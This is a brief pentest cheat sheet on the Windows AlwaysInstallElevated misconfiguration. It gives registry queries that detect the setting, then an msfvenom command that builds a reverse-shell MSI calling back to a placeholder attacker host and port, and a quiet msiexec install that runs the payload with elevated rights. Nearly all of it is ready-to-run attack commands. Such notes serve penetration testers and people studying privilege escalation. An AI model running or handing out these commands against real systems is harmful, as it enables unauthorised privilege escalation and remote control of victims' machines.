# AlwaysInstallElevated

## Detection

reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

Both must equal 1.

## Exploitation

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi

msiexec /quiet /qn /i shell.msi
